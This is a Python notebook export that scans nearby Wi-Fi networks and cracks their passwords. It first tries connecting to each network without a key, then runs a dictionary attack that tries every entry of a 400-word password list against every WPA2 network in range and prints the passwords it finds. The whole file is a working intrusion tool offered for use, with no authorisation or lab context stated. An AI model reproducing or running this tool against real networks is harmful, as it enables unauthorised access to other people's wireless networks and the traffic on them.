#!/usr/bin/env python
# coding: utf-8

# In[ ]:


import time
#To hault the flow of program
#https://docs.python.org/3/library/time.html

#pip install pywifi

import pywifi
from pywifi import const
#To work with wireless interfaces
#https://pypi.org/project/pywifi/
#https://github.com/awkman/pywifi/blob/master/DOC.md


# In[ ]:


available_devices = []
keys = []
final_output = {}


# #### Get interface information

# In[ ]:


wifi = pywifi.PyWiFi()
interface = wifi.interfaces()[0]


# ##### In general, there will be only one Wi-Fi interface in the platform. Thus, use index 0 to obtain the Wi-Fi interface. 

# ### Get the name of the Wi-Fi interface.

# In[ ]:


print(interface.name())


# ### Now let's scan the network.

# In[ ]:


interface.scan()


# In[ ]:


time.sleep(5) 
#Because the scan time for each Wi-Fi interface is variant. 
#It is safer to call scan_results() 2 ~ 8 seconds later after calling scan().


# ### Obtain the results of the previous triggerred scan. A Profile list will be returned.

# In[ ]:


x = interface.scan_results()
print(type(x))


# ## Let's see all network Profiles

# In[ ]:


for i in x:
    #print(i.ssid)
    available_devices.append(i.ssid)


# In[ ]:


for i in available_devices:
    print ("{:<5} => {:}".format("Host Name", i))


# In[ ]:


for i in available_devices:
    nm = i
    i=i.strip()
    profile = pywifi.Profile()
    profile.ssid = i
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_NONE)
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.remove_all_network_profiles()
    profile = iface.add_network_profile(profile)
    iface.connect(profile)
    time.sleep(4)
    if iface.status() == const.IFACE_CONNECTED:
        print('success password of the network',i,' is',"none")
        final_output[i] = ""
        available_devices.remove(nm)


# # step-2

# In[ ]:


with open('top400.txt','r') as f:
    for i in f:
        i = i.replace('\n','')
        if i not in keys:
            keys.append(i)


# In[ ]:


print(keys)


# In[ ]:


try:
    for i in available_devices:
        profile = pywifi.Profile()
        i=i.strip()
        profile.ssid = i
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        flag=0
        for j in keys:
            j=j.strip()
            profile.key = j
            wifi = pywifi.PyWiFi()
            iface = wifi.interfaces()[0]
            iface.remove_all_network_profiles()
            profile = iface.add_network_profile(profile)

            iface.connect(profile)
            time.sleep(4)
            if iface.status() == const.IFACE_CONNECTED:
                print('success password of the network',i,' is',j)
                final_output[i] = j
                flag=1
                break
except Exception as e:
    print(e)
        #if flag == 0:
        #print('sorry we are not able to CRACK PASSWORD of',i)


# In[ ]:


print('*'*10,'Discovered Password','*'*10)
print("{0:<12} {1:<}".format("HOST NAME","PASSWORD"))
for SSID,Key in final_output.items():
    print ("{:<12}|{:<12}".format(SSID, Key))
available_devices.clear()

